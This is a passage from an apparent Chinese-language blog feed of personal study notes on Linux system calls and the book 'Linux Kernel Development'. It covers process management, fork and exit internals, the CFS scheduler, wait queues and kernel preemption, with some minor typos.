<p>系统调用是运行在内核态的，而应用程序基本都是运行在用户态的。</p>
<p>操作系统通过中断来从用户态切换到内核态。</p>
<h4 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h4><p>中断是一个硬件或软件发出的请求，要求CPU暂停当前的工作转手去处理更加重要的事情。</p>
<p>中断一般具有两种属性，一个称为中断号（从0开始），一个称为中断处理程序。</p>
<p>不同的中断具有不同的中断号，而一个中断处理程序对应一个中断号。</p>
<p>在内核中，有个数组称为中断向量表，这个数组的第n向包含了指向第n号中断的中断的中断处理程序的指针。</p>
<p>当中断到来时，CPU会暂停当前执行的代码，根据中断的中断号，在中断向量表中找到对应的中断处理程序，并调用它。中断处理程序执行完成之后，CPU会继续执行之前的代码。</p>
<h4 id="系统调用-1"><a href="#系统调用-1" class="headerlink" title="系统调用"></a>系统调用</h4><p>和中断一样，系统调用都有一个系统调用号，这个系统调用号通常就是系统调用在系统调用表中的位置。</p>
<h3 id="基于int的Linux的经典系统调用实现"><a href="#基于int的Linux的经典系统调用实现" class="headerlink" title="基于int的Linux的经典系统调用实现"></a>基于int的Linux的经典系统调用实现</h3><p>以fork为例的Linux系统调用：</p>
<ol>
<li>触发中断</li>
<li>切换堆栈<ol>
<li>保存当前ESP、SS的值</li>
<li>将ESP、SS的值设置为内核栈的相应值。</li>
</ol>
</li>
<li>中断处理程序</li>
</ol>
<h3 id="Linux的新型系统调用机制"><a href="#Linux的新型系统调用机制" class="headerlink" title="Linux的新型系统调用机制"></a>Linux的新型系统调用机制</h3><p>Linux在2.5版本起开始支持一种新型的系统调用机制。</p>
<p>linux-gate.so.1是操作系统生成的一个虚拟动态库（VDSO），这个库总是被加载在地址0xffffe000的位置上。(32位)</p>
<h2 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h2><p>Windows API是指Windows操作系统提供给应用程序开发者的最底层、最直接与Windows打交道的接口。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>linux</tag>
        <tag>编译</tag>
        <tag>链接</tag>
        <tag>装载</tag>
        <tag>动态装载</tag>
      </tags>
  </entry>
  <entry>
    <title>《Linux内核设计与实现》</title>
    <url>/2020/05/09/%E7%AC%94%E8%AE%B0/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="Linux内核设计与实现"><a href="#Linux内核设计与实现" class="headerlink" title="Linux内核设计与实现"></a>Linux内核设计与实现</h1><h2 id="操作系统和内核简介"><a href="#操作系统和内核简介" class="headerlink" title="操作系统和内核简介"></a>操作系统和内核简介</h2><p>处理器上任何指定时间点上的活动必然概况为下列三者之一（当CPU空闲时，相当于运行一个空间程，运行于内核空间）：</p>
<p><img src="./img/1585145258.jpg" alt="应用程序、内核和硬件的关系"></p>
<h3 id="内核开发特点"><a href="#内核开发特点" class="headerlink" title="内核开发特点"></a>内核开发特点</h3><ol>
<li>无libc库也无标准头文件</li>
<li>没有内存保护机制</li>
<li>不要轻易在内核中使用浮点数</li>
<li>容积小而固定的栈</li>
<li>同步和并发</li>
</ol>
<h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>进程就是处于执行器的程序，并包括其资源（如打开的文件，挂起的信号，内核内部数据，处理器状态，一个或多个具有内存映射的内存地址空间以及一个或一个的执行线程，还有数据段等）。</p>
<p>执行线程，简称线程。每个线程都拥有一个独立的程序计算器、进程栈和一组进程寄存器。内核调度的对象是线程而非进程。</p>
<p>进程是处于执行期的程序以及相关的资源的总称。</p>
<h3 id="进程描述符及任务结构"><a href="#进程描述符及任务结构" class="headerlink" title="进程描述符及任务结构"></a>进程描述符及任务结构</h3><p>内核把进程的列表存放在叫做任务队列的双向循环链表中。链表中的每一项都是类型为task_struct、称为进程描述符的结构（定义在&lt;linux/sched.h&gt;文件中）</p>
<h4 id="分配进程描述符"><a href="#分配进程描述符" class="headerlink" title="分配进程描述符"></a>分配进程描述符</h4><p>linux通过slab分配器分配task_struct结构。</p>
<p>struct thread_info在文件&lt;asm/thread_info.h&gt;中定义。</p>
<p>内核通过一个唯一的进程标识值或PID来标识每个进程。</p>
<p>系统管理员可通过修改/proc/sys/kernel/pid_max来提高进程最大数目的上限。</p>
<h5 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h5><p>进程描述符中的state域描述了进程的当前状态。每个进程都必然处于五种进程状态中的一种：</p>
<p>TASK_RUNNING（运行）——进程是可执行的；它或正在执行，或在运行队列中等待执行。这是进程在用户控件中执行的唯一可能状态；该状态也可以应用到内核空间中正在执行的进程。</p>
<p>TASK_INTERRUPTLBLE（可中断）——进程正在睡眠（即阻塞），等待某些条件的达成。一旦这些条件达成，内核就会把进程状态设置为运行。处于此状态的进程也会因为接收到信号而提前被唤醒并随时准备投入运行。</p>
<p>TASK_UNINTERRUPTLBLE（不可中断）——除了就算是接收到信号也不会被唤醒或准备投入运行外，这个状态与可打断状态相同。通常在进程必须在等待时不受干扰或等待事件很快就会发生时出现。</p>
<p>_TASK_TRACED——被其他进程跟踪的进程，例如通过ptrace对调试程序进行跟踪。</p>
<p>_TASK_STOPPED（停止）——进程停止执行；进程没有投入运行也不能投入运行。通常这种状态发生在接收到SIGSTOP、SIGTSTP、SIGTTIN、SIGTTOU等信号时。此外，在调试期间接收到任何信号，都会使进程进入这种状态。</p>
<p><img src="./img/1585215912.png" alt="进程状态转化"></p>
<h5 id="设置当前进程状态"><a href="#设置当前进程状态" class="headerlink" title="设置当前进程状态"></a>设置当前进程状态</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">set_task_state(task, state);</span><br><span class="line">set_current_state(state);<span class="comment">//等同于set_task_state(current, state);</span></span><br></pre></td></tr></table></figure>

<h5 id="进程上下文"><a href="#进程上下文" class="headerlink" title="进程上下文"></a>进程上下文</h5><p>即当一个程序执行了系统调用或者触发了某个异常，它就陷入了内核空间。此时，我们称内核“代表进程执行”并处于进程上下文中。在此上下文中current宏是有效的。除非在此间隙有更高优先级的进程需要执行并由调度器做出了相应调整，否则在内核退出时，程序恢复，在用户空间会继续执行。</p>
<p>系统调用和异常处理程序是对内核明确定义的接口。进程只有通过这些接口才能陷入内核执行——对内核的所有访问都必须通过这些接口。</p>
<h3 id="进程创建"><a href="#进程创建" class="headerlink" title="进程创建"></a>进程创建</h3><h4 id="fork-与exec"><a href="#fork-与exec" class="headerlink" title="fork()与exec()"></a>fork()与exec()</h4><p>fork()通过拷贝当前进程创建一个子进程。子进程与父进程的区别仅仅在于PID、PPID和某些资源和统计量。exec()函数负责读取可执行文件并将其载入地址空间开始运行。</p>
<h4 id="写时拷贝"><a href="#写时拷贝" class="headerlink" title="写时拷贝"></a>写时拷贝</h4><p>Linux的fork()使用写时拷贝页实现。写时拷贝是一种可以推迟甚至免除拷贝数据的技术。内核此时并不复制整个进程地址空间，而是让父进程和子进程共享同一个拷贝。</p>
<p>只有在需要写入时，数据才会被复制，从而使各个进程拥有各自的拷贝。</p>
<h4 id="fork"><a href="#fork" class="headerlink" title="fork()"></a>fork()</h4><p>Linux通过clone()系统调用实现fork()。这个调用通过一系列的参数标志来指明父、子进程需要的共享资源。fork()、vfork()、和__clone()库函数都根据各自需要的参数标志去调用clone()，然后由clone()去调用do_fork()。</p>
<p>do_fork的定义在kernel/fork.c文件中。该函数调用copy_process()函数，然后让进程开始运行。copy_process()函数的工作如下：</p>
<ol>
<li>调用dup_task_struct()为新进程创建一个内核栈、thread_info结构和task_struct，这些值与当前进程的值相同。</li>
<li>检查并确保新创建的这个子进程后，当前用户所拥有的进程数目没有超出给它分配的资源的限制。</li>
<li>子进程中的进程描述符内的许多成员都要被清0或设为初始值。主要是统计信息。task_struct中的大多数数据都依然未被修改。</li>
<li>子进程的状态被设置为TASK_UNINTERRUPTLBLE，以保证它不会投入运行。</li>
<li>copy_process()调用copy_flags()以更新task_struct的flags成员。表明进程是否拥有超级用户权限的PF_SUPERPRIV标志被清0.表明进程还没有调用exec()函数的PF_FORKNOEXEC标志被设置。</li>
<li>调用alloc_pid()为新进程分配一个有效的PID。</li>
<li>根据传递给clone()的参数标志，copy_process()拷贝或共享打开的文件、文件系统信息、信号处理函数、进程地址空间和命名空间等。</li>
<li>最后，copy_process()做扫尾工作并返回一个指向子进程的指针。</li>
</ol>
<p>再回到do_fork()函数，如果copy_process()函数成功返回，新创建的子进程被唤醒并让其投入运行，内核有意选择子进程先执行。（因为一般子进程都会马上调用exec()函数，这样可以避免写时拷贝的额外开销。）</p>
<h4 id="vfork"><a href="#vfork" class="headerlink" title="vfork()"></a>vfork()</h4><p>除了不拷贝父进程的页表项外，vfork()系统调用和fork()的功能相同。</p>
<p>vfork()系统调用的实现是通过向clone()系统调用传递一个特殊标志来进行的。</p>
<ol>
<li>在调用copy_process()时，task_struct的vfork_done成员被设置为NULL。</li>
<li>在执行do_fork()时，如果给定特别标志，则vfork_done会指向一个特定地址。</li>
<li>子进程先开始执行后，父进程不是马上恢复执行，而是一直等到，直到子进程通过vfork_done指针向他发送信号。</li>
<li>在调用mm_release()时，该函数用于进程退出内存地址空间，并且检查vfork_done是否为空，如果不为空，则会向父进程发送信号。</li>
<li>回到do_fork()，父进程醒来并返回。</li>
</ol>
<h3 id="线程在Linux中的实现"><a href="#线程在Linux中的实现" class="headerlink" title="线程在Linux中的实现"></a>线程在Linux中的实现</h3><h4 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h4><p>一个普通的fork()的实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">clone(SIGCHLD, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>其中SIGCHLD为参数标志，在&lt;linux/sched.h&gt;中定义了clone()用到的参数标志及其作用。</p>
<h4 id="内核线程"><a href="#内核线程" class="headerlink" title="内核线程"></a>内核线程</h4><p>内核线程——独立运行在内核空间的标准线程。内核线程和普通的进程间的区别在于内核线程没有独立的地址空间，仅在内核空间运行，从来不切换到用户空间去。</p>
<p>内核线程只能由其他内核线程创建。内核是通过从kthreadd内核进程中衍生出所有新的内核线程来自动处理这一点的。在&lt;linux/kthread.h&gt;中申明有接口。从现有内核线程中创建一个新的内核线程的方法如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">struct task_struct *kthread_create(int (*threadfn)(void *data)), void *data, const char namefmt[], ...)</span><br></pre></td></tr></table></figure>

<p>新的任务是由kthread内核进程通过clone()系统调用而创建的。新的进程将允许threadfn函数，给其传递的参数为data。进程名为namefmt，接受可变参数列表类似于printf()的格式化参数。新创建的进程处于不可运行状态，需通过wake_upprocess()明确唤醒它。</p>
<p>创建一个进程并让它运行起来，可以通过调用kthread_run()来达到：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">struct task_struct *kthread_run(int (*threadfn)(void *data)), void *data, const char namefmt[], ...)</span><br></pre></td></tr></table></figure>

<p>该例程以宏实现，仅简单地调用了kthread_create()和wake_up_process()。</p>
<p>内核线程启动后就一直运行知道调用do_exit()退出，或者内核的其他部分调用kthread_stop()退出：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kthread_stop</span><span class="params">(struct task_struct *k)</span></span>;</span><br></pre></td></tr></table></figure>

<p>其中k为kthread_create返回的task_struct结构。</p>
<h4 id="进程终结"><a href="#进程终结" class="headerlink" title="进程终结"></a>进程终结</h4><p>一般来说，进程的析构是自身引起的。它发生在进程调用exit()系统调用时（既可能显式调用这个系统调用，也可能隐式地从某个程序的主函数返回）。当进程接受到它既不能处理也不能忽略的信号或异常时，它还可能被动终结。但不管如何终结的，任务大部分都要靠do_exit()（定义于&lt;kernel/exit.c&gt;中）来完成：</p>
<ol>
<li>将task_struct中的标志成员设置为PF_EXITNG。</li>
<li>调用del_timer_sync()删除任一内核定时器。根据返回结果，确保没有定时器在排队，也没有定时器处理程序在运行。</li>
<li>如果BSD的进程记账功能是开启的，do_exit()调用acct_update_integrals()来输出记账信息。</li>
<li>然后调用exit_mm()函数释放进程占用的mm_struct，如果没有别的进程使用它们（即没有被共享），就彻底释放。</li>
<li>接下来调用sem_exit()函数。如果进程排队等候IPC信号，则离开队列。</li>
<li>调用exit_files()和exit_fs()，以分别递减文件描述符、文件系统数据的引用计数。若其中某个引用计数的数值降为0，那么就代表没有进程在使用相应的资源，此时可以释放。</li>
<li>接着把存放在task_struct的exit_code成员中的任务退出代码置为exit()提供的退出代码，或者去完成任何其他由内核机制规定的退出动作。退出代码存放在这里供父进程随时检索。</li>
<li>调用exit_notify()向父进程发送信号，给子进程重新找养父，养父为线程组中的其他线程或者为init进程，并把进程状态（存放在task_struct结构的exit_state中）设置成EXIT_ZOMBIE。</li>
<li>do_exit()调用schedule()切换到新的进程（因为EXIT_ZOMBIE状态的进程不会再被调度，所以这是进程所执行的最后一段代码。do_exit()永不返回）。</li>
</ol>
<p>至此，进程所占用的所有内存就是内核栈、thread_info结构和task_struct结构。此时进程存在的唯一目的就是向它的父进程提供信息。父进程检索到信息后，或者通知内核那是无关信息后，由进程所持有的剩余内存被释放，归还给系统使用。</p>
<h5 id="删除进程描述符"><a href="#删除进程描述符" class="headerlink" title="删除进程描述符"></a>删除进程描述符</h5><p>进程终结时所需的清理工作和进程描述符的删除被分开执行。</p>
<p>wait()这一族函数都是通过唯一的一个系统调用wait4()来实现的。其标准动作是挂起调用它的进程，直到其中一个子进程退出，此时函数会返回该子进程的PID。此时，调用该函数时提供的指针会包含子函数退出时的退出代码。</p>
<p>当最终需要释放进程描述符时，release_task()会被调用：</p>
<ol>
<li>它调用__exit_signal()，该函数调用_unhash_process()，后者又调用detach_pid()从pidhash上删除该进程，同时也要从任务列表中删除该进程。</li>
<li>__exit_signal()释放目前僵死进程所使用是所有剩余资源，并进行最终统计和记录。</li>
<li>如果这个进程是线程组最后一个进程，并且领头进程以及死掉，那么release_task()就要通知僵死的领头进程父进程。</li>
<li>release_task()调用put_task_struct()释放进程内核栈和thread_info结构所占的页，并释放task_struct所占用的slab高速缓存。</li>
</ol>
<h5 id="孤儿进程的解决"><a href="#孤儿进程的解决" class="headerlink" title="孤儿进程的解决"></a>孤儿进程的解决</h5><p>对于孤儿进程退出时处于僵死状态白白浪费内存放问题，解决方法是给子进程在当前线程组内找一个线程作为父亲，如果不行，就让init做它们的父进程。</p>
<ol>
<li>在do_exit()中会调用exi_notify()，该函数会调用forget_original_parent()，而后者会调用find_new_reaper来执行寻父过程。</li>
<li>当找到合适的养父进程时，只需要遍历所有子进程并为它们设置新的父进程。</li>
<li>然后调用ptrace_exit_finish()，同样进行新的寻父进程，不过这次是给ptraced的子进程寻找父亲。</li>
</ol>
<p>一旦系统为进程找到并设置了新的父进程，就不会再出现驻留僵死进程的情况。init进程会例行调用wait()来检查其子进程，清除所有与其相关的僵死进程。</p>
<h2 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h2><h3 id="多任务"><a href="#多任务" class="headerlink" title="多任务"></a>多任务</h3><p>多任务系统可以划分为两类：非抢占式多任务和抢占式多任务。</p>
<p>Linux提供了抢占式多任务模式。此模式下，由调度程序来决定什么时候停止一个进程的运行，以便其他进程能够得到执行的机会。这个强制的挂起动作叫做抢占。</p>
<p>在非抢占式多任务模式下，除非进程自己主动退出，否则它会一直执行。进程主动挂起自己的操作称为让步。</p>
<h3 id="Linux的进程调度"><a href="#Linux的进程调度" class="headerlink" title="Linux的进程调度"></a>Linux的进程调度</h3><p>O(l)调度器</p>
<ol>
<li>静态时间片算法</li>
<li>运行队列</li>
<li>反转楼梯最后期限调度算法(RSDL)</li>
<li>完全公平调度算法(CFS)</li>
</ol>
<h3 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h3><h4 id="I-O消耗性和处理器消耗型进程"><a href="#I-O消耗性和处理器消耗型进程" class="headerlink" title="I/O消耗性和处理器消耗型进程"></a>I/O消耗性和处理器消耗型进程</h4><p>I/O消耗型进程指进程的大部分时间用来提交I/O请求或者等待I/O请求。这样的进程经常处于可运行状态，但通常都是运行短短一会儿。</p>
<p>处理器消耗型进程大部分时间都在执行代码上，除非被抢占，否则它们通常都一直不停地运行，因为它们没有太多的I/O需求。对于这类进程，调度策略往往是尽量降低它们的调度频率，而延长其运行时间。</p>
<p>调度策略通常要在两个矛盾的目标中间寻求平衡：进程响应迅速和最大系统利用率。Linux为了保证交互应用和桌面系统的性能，所以对进程的响应做了优化，更倾向于优先调度I/O消耗型进程。</p>
<h4 id="进程优化级"><a href="#进程优化级" class="headerlink" title="进程优化级"></a>进程优化级</h4><p>Linux采用两种不同的优先级范围：</p>
<ol>
<li>第一种是nice值，范围从-20到+19，默认值为0，越大的nice值意味着更低的优先级。在Linux中，nice值代表时间片的比例。可以通过ps -el命令查看，NI值即为nice值。</li>
<li>第二种是实时优先级，默认情况下变化范围是0到99。越高的实时优化级意味着进程优先级越高。任何实时进程的优先级都高于普通的进程。可用ps -eo state,uid,pid,ppid,rtprio,time,comm查看，其中rtprio为实时优先级，若为”-“,则说明不是实时进程。</li>
</ol>
<h4 id="时间片"><a href="#时间片" class="headerlink" title="时间片"></a>时间片</h4><p>时间片是一个数值，它表明进程在被抢占前所能持续运行的时间。</p>
<p>Linux下，是否要将一个进程立刻投入运行，是完全由进程优先级和是否有时间片决定的。在新的CFS调度器中，其抢占时机取决于心底 可运行程序消耗了多少处理器使用比。如果消耗的使用比比当前进程小，则新进程立刻投入运行。</p>
<h4 id="调度策略活动"><a href="#调度策略活动" class="headerlink" title="调度策略活动"></a>调度策略活动</h4><h3 id="Linux调度算法"><a href="#Linux调度算法" class="headerlink" title="Linux调度算法"></a>Linux调度算法</h3><h4 id="调度器类"><a href="#调度器类" class="headerlink" title="调度器类"></a>调度器类</h4><p>linux调度器是以模块方式提供的。这种模块化结构被称为调度器类，它允许多种不同的可动态添加的调度算法并存，调度属于自己范畴的进程。每个调度器都有一个优先级，基础的调度器代码定义在kernel/sched.c文件中。它会安装优先级顺序遍历调度类，拥有一个可执行进程的最高优先级的调度器类生出，去选择下面要执行的那个程序。</p>
<p>完全公平调度(CFS)是一个针对普通进程的调度类，在Linux中称为SCHED_NORMAL，定义在kernel/sched_fair.c中。</p>
<h4 id="公平调度"><a href="#公平调度" class="headerlink" title="公平调度"></a>公平调度</h4><p>CFS的出发点基于一个简单的理念：进程调度的效果应如同系统具备一个理想中的完美多任务处理器。在这种系统中，每个进程将能获得1/n的处理器时间。同时，完美可以调度给它们无限小的时间周期，所以在任何可测量周期内，我们给予n个进程中每个进程同样多的运行时间。</p>
<p>CFS允许每个进程运行一段时间、循环轮转、选择运行时间最少的程序作为下一个运行程序。nice值在CFS中被作为进程获得的处理器运行比重。</p>
<p>CFS引入了每个进程获得的时间片底线，这个底线称为最小粒度。默认情况下这个值是1ms。</p>
<h3 id="Linux调度的实现"><a href="#Linux调度的实现" class="headerlink" title="Linux调度的实现"></a>Linux调度的实现</h3><h4 id="时间记账"><a href="#时间记账" class="headerlink" title="时间记账"></a>时间记账</h4><h5 id="调度器实体结构"><a href="#调度器实体结构" class="headerlink" title="调度器实体结构"></a>调度器实体结构</h5><p>CFS使用调度器实体结构（定义在&lt;linux/sched.h&gt;的struct_sched_entity中）来追踪进程运行记账。</p>
<p>调度器实体结构作为一个名为se的成员变量，嵌入在进程描述符内。</p>
<h5 id="虚拟实时"><a href="#虚拟实时" class="headerlink" title="虚拟实时"></a>虚拟实时</h5><p>vruntime变量存放进程的虚拟运行时间，该运行时间（花在运行商的时间和）的计算是经过了所有可运行进程总数的标准化。虚拟时间是以ns为单位的。CFS用vruntime变量来记录一个程序到底运行了多长时间以及它还应该再运行多久。</p>
<p>在kernel/sched_fair.c中的update_curr()函数实现了该记账功能。</p>
<p>update_curr()计算了当前进程的执行时间，并且将其存放在变量delta_exec中。然后又将运行时间传递给了__update_curr()，由后者再根据当前可运行进程总数对运行时间进程加权计算。最终将上述的权重值与当前运行进程的vruntime相加。</p>
<p>update_curr()是由系统定时器周期性调用的。</p>
<h4 id="进程选择"><a href="#进程选择" class="headerlink" title="进程选择"></a>进程选择</h4><p>CFS调度算法的核心：选择具有最小vruntime的任务。</p>
<p>CFS使用红黑树来组织可运行进程队列，并利用其迅速找到最小vruntime值的进程。</p>
<h5 id="挑选下一个任务"><a href="#挑选下一个任务" class="headerlink" title="挑选下一个任务"></a>挑选下一个任务</h5><p>实现这一过程的函数是__pick_next_entity()，它定义在kernel/sched_fair.c中。</p>
<h5 id="向树中加入进程"><a href="#向树中加入进程" class="headerlink" title="向树中加入进程"></a>向树中加入进程</h5><p>CFS将进程加入红黑树以及缓存最左叶子节点的过程发送在进程变为可执行状态（被唤醒）或者是通过fork()调用第一次创建进程时。</p>
<p>enqueue_entity()函数实现了这一目的。该函数更新运行时间和其他一些统计数据，然后调用__enqueue_entity()进程繁重的插入操作，把数据项真正插入到红黑树中。</p>
<h5 id="从树中删除进程"><a href="#从树中删除进程" class="headerlink" title="从树中删除进程"></a>从树中删除进程</h5><p>删除动作发送在进程堵塞或者终止时。</p>
<p>dequeue_entity()函数实现了这一目的。和添加进程一样，实际工作是由辅助函数__dequeue_entity()完成的。</p>
<h4 id="调度器入口"><a href="#调度器入口" class="headerlink" title="调度器入口"></a>调度器入口</h4><p>进程调度的主要入口点是函数schedule()，定义在kernel/sched.c中。schedule()通常需要和一个具体的调度类相关联。该函数唯一重要的事是调用pick_next_task()，用以优先级为序，从高到低，依次检查每一个调度类，并且从最高优先级的调度类中，选择最高优先级的进程。</p>
<h4 id="睡眠和唤醒"><a href="#睡眠和唤醒" class="headerlink" title="睡眠和唤醒"></a>睡眠和唤醒</h4><p>休眠（被堵塞）的进程处于一个特殊的不可执行状态。内核对于进程休眠的操作如下：进程把自己标记成休眠状态，从可执行红黑树中移出，放入等待队列，然后调用schedule()选择和执行一个其他进程。唤醒的过程则恰好相反：进程被设置为可执行状态，然后再从等待队列中移到可执行红黑树中。</p>
<h5 id="等待队列"><a href="#等待队列" class="headerlink" title="等待队列"></a>等待队列</h5><p>休眠通过等待队列进行处理。等待队列是由等待某些事件发生的进程组成的简单链表。内核用wake_queue_head_t来代表等待队列。</p>
<p>等待队列可以通过DECLARE_WAITQUEU()静态创建，也可以由init_waitqueue_head()动态创建。</p>
<p>进程通过执行以下步骤将自己加入到一个等待队列中：</p>
<ol>
<li>调用宏DEFINE_WAIT()创建一个等待队列的项。</li>
<li>调用add_wait_queue()把自己加入到队列中。该队列会在进程等待的条件满足时唤醒它。</li>
<li>调用prepare_to_wait()方法将进程的装填变更为TASK_INTERRUPTIBLE或TASK_UNINTERRUPTIBLE。而且该函数如果有必要的话会将进程加回到等待队列，这是在接下来循环遍历中需要的。</li>
<li>如果状态被设置为TASK_INTERRUPTIBLE，则信号唤醒进程。</li>
<li>当进程被唤醒时，它会再次检查条件是否为真。。如果是，它就退出循环；如果不是，它再次调用schedule()并一直重复这步操作。</li>
<li>当条件满足后，进程将自己设置为TASK_RUNNING并调用finish_wait()方法把自己移出等待队列。</li>
</ol>
<p>函数inotify_read()位于fs/notify/inotify/inotify_user.c中，负责从通知文件描述符中读取信息。</p>
<h5 id="唤醒"><a href="#唤醒" class="headerlink" title="唤醒"></a>唤醒</h5><p>唤醒操作通过函数wake_up()进行，它会唤醒指定的等待队列上的所有进程。它调用函数try_to_wake_up()，该函数负责将进程设置为TASK_RUNNING状态，调用enqueue_task()将进程放入红黑树，若唤醒的进程优先级比当前正在执行的进程优先级高，还要设置need_resched标志。</p>
<p><img src="./img/1585640196.png" alt="休眠与唤醒"></p>
<h3 id="抢占和上下文切换"><a href="#抢占和上下文切换" class="headerlink" title="抢占和上下文切换"></a>抢占和上下文切换</h3><p>上下文奇幻，也就是从一个可执行进程切换到另一个可执行进程，由定义在kernel/sched.c中的context_switch()函数负责。它完成了两项基本工作：</p>
<ol>
<li>调用声明在&lt;asm/mmu_context.h&gt;中的switch_mm()，该函数负责把虚拟内存从上一个进程映射切换到新进程中。</li>
<li>调用声明在&lt;asm/system.h&gt;中的switch_to()，该函数负责从上一个进程的处理器状态切换到新进程的处理器状态。包括保存、恢复栈信息和寄存器信息，还有其他任何与体系结构相关的状态信息，都必须以每个进程为对象进行管理和保存。</li>
</ol>
<p>内核提供了一个need_resched标志来表明是否需要重新执行一次调度。当某个进程应该被抢占时，scheduler_tick()就会设置这个标志：当一个优先级高的进程进入可执行状态的时候，try_to_wake_up()也会设置这个标志，内核检查该标志，确认其被设置，调用schedule()来切换到一个新的进程。</p>
<p>在返回用户空间以及从中断返回的时候，内核也会检查need_resched标志。如果已被设置，内核会在继续执行之前调用调度程序。</p>
<h4 id="用户抢占"><a href="#用户抢占" class="headerlink" title="用户抢占"></a>用户抢占</h4><p>内核即将返回用户空间的时候，如果need_resched标志被设置，会导致schedule()被调用，此时就会发生用户抢占。用户抢占发生在以下情况时：</p>
<ul>
<li>从系统调用返回用户空间时。</li>
<li>从中断处理程序返回用户空间时。</li>
</ul>
<p>从中断处理程序或者系统系统调用返回的返回路径都是跟体系结构相关的，在entry.s（此文件包含内核入口部分以及内核退出部分的程序）文件中通过汇编语言来实现。</p>
<h4 id="内核抢占"><a href="#内核抢占" class="headerlink" title="内核抢占"></a>内核抢占</h4><p>Linux完整地支持内核抢占。只要重新调度是安全的（即没有持有锁），内核可以在任何时间抢占正在执行的任务。</p>
<p>锁是非抢占区域的标志。当使用锁的时候，thread_info中的preempt_count计数器（初始值为0）数值加1，释放锁的时候数值减1。当数值为0时，内核就可以执行抢占。</p>
<p>如果内核中的进程被阻塞了，或者它显式地调用了schedule()，内核抢占也会显式地发生。</p>
<p>内核抢占会发生在：</p>
<ul>
<li>中断处理程序正在执行，且返回内核空间之前。</li>
<li>内核代码再一次具有可抢占性的时候。</li>
<li>如果内核中的任务显式地调用schedule()。</li>
<li>如果内核中的任务阻塞。</li>
</ul>
<h3 id="实时调度策略"><a href="#实时调度策略" class="headerlink" title="实时调度策略"></a>实时调度策略</h3><p>Linux提供了两种实时调度策略：SCHED_FIFO和SCHED_RR。普通的、非实时的调度策略是SCHED_NORMAL。具体实现定义在kernel/sched_rt.c中。</p>
<p>SCHED_FIFO实现了简单的、先入先出的调度算法。处于可运行状态的SCHED_FIFO级进程会比任何SCHED_NORMAL级的进程都先得到调度。一旦一个SCHED_FIFO进程处于可执行状态，就会一直执行，知道它自己受阻塞或显式地释放处理器为止。只有更高优先级的SCHED_FIFO或SCHED_RR任务才可以抢占它。若有两个或多个同优先级的SCHED_FIFO级进程，它们会轮流执行，但依然只有它们愿意让出处理器时才会退出。</p>
<p>SCHED_RR与SCHED_FIFO大体相同。但SCHED_RR级的进程在耗尽事先分配给他的时间后就不能继续执行了。</p>
<p>实时优先级范围从0到MAX_RT_PRIO减1。SCHED_NORMAL级进程的nice值共享了这个取值空间：从MAX_RT_PRIO到MAX_RT_PRIO+40。即nice从-20到+19直接对应100到139的实时优先级范围。</p>
<h3 id="与调度相关的系统调用"><a href="#与调度相关的系统调用" class="headerlink" title="与调度相关的系统调用"></a>与调度相关的系统调用</h3><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><h3 id="与内核通信"><a href="#与内核通信" class="headerlink" title="与内核通信"></a>与内核通信</h3><h3 id="API、POSIX和C库"><a href="#API、POSIX和C库" class="headerlink" title="API、POSIX和C库"></a>API、POSIX和C库</h3><h3 id="系统调用-1"><a href="#系统调用-1" class="headerlink" title="系统调用"></a>系统调用</h3><h4 id="系统调用号"><a href="#系统调用号" class="headerlink" title="系统调用号"></a>系统调用号</h4><p>内核记录了系统调用表中所有已注册过的系统调用的列表，存储在sys_call_talbe中。x86-64体系中，定义于arch/i386/kernel/syscall_64.c中。这个表位每一个有效的系统调用指定了唯一的系统调用号。</p>
<h4 id="系统调用的性能"><a href="#系统调用的性能" class="headerlink" title="系统调用的性能"></a>系统调用的性能</h4><h3 id="系统调用处理程序"><a href="#系统调用处理程序" class="headerlink" title="系统调用处理程序"></a>系统调用处理程序</h3><p>应用程序以某种方式通知系统，从而使系统切换到内核态，从而内核代表应用程序在内核空间执行系统调用。</p>
<p>通知内核机制是通过软中断实现的：通过引发一个异常来促使系统切换到内核态去执行异常处理程序。此时的异常处理程序即为系统调用处理程序。</p>
<h4 id="指定恰当的系统调用"><a href="#指定恰当的系统调用" class="headerlink" title="指定恰当的系统调用"></a>指定恰当的系统调用</h4><p>在x86上，系统调用号是通过eax寄存器传递给内核的。system_call()函数通过将给定的系统调用号与NR_syscalls做笔记来检查其有效性。如果大于或等于NR_syscalls，该函数返回-ENOSYS。否则，就执行相应的系统调用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call *sys_call_table(,%rax,8);</span><br></pre></td></tr></table></figure>

<p><img src="./img/1585746738.jpg" alt="调用系统调用处理程序以执行一个系统调用"></p>
<h4 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h4><h3 id="系统调用的实现"><a href="#系统调用的实现" class="headerlink" title="系统调用的实现"></a>系统调用的实现</h3><h3 id="系统调用上下文"><a href="#系统调用上下文" class="headerlink" title="系统调用上下文"></a>系统调用上下文</h3><p>内核在执行系统调用的时候处于进程上下文。current指针指向当前任务，即引发系统调用的进程。</p>
<p>在进程上下文中，内核可以休眠并且可以被抢占。</p>
